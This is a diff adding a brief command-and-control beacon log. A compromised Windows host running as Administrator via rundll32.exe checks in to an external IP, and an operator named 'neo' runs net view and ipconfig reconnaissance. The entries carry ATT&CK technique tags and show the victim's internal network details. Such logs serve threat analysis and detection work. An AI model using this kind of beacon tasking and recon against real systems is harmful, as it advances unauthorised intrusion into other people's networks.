@@ -1,0 +1,35 @@
+10/07 07:05:55 UTC [metadata] 112.226.65.29 <- 192.168.110.29; computer: JT-202303111428; user: Administrator *; process: rundll32.exe; pid: 11252; os: Windows; version: 10.0; build: 19044; beacon arch: x64 (x64)
+10/07 07:09:46 UTC [input] <neo> net view
+10/07 07:09:46 UTC [task] <T1018, T1093> Tasked beacon to run net view
+10/07 07:09:52 UTC [checkin] host called home, sent: 105057 bytes
+10/07 07:09:54 UTC [output]
+received output:
+List of hosts:
+
+
+
+10/07 07:10:54 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 1231
+
+
+10/07 07:12:10 UTC [input] <neo> shell ipconfig
+10/07 07:12:10 UTC [task] <T1059> Tasked beacon to run: ipconfig
+10/07 07:12:54 UTC [checkin] host called home, sent: 39 bytes
+10/07 07:12:54 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 以太网:
+
+   连接特定的 DNS 后缀 . . . . . . . : lan
+   本地链接 IPv6 地址. . . . . . . . : fe80::7c7f:4fcf:145c:4df0%3
+   IPv4 地址 . . . . . . . . . . . . : 192.168.110.29
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.110.1
+
+
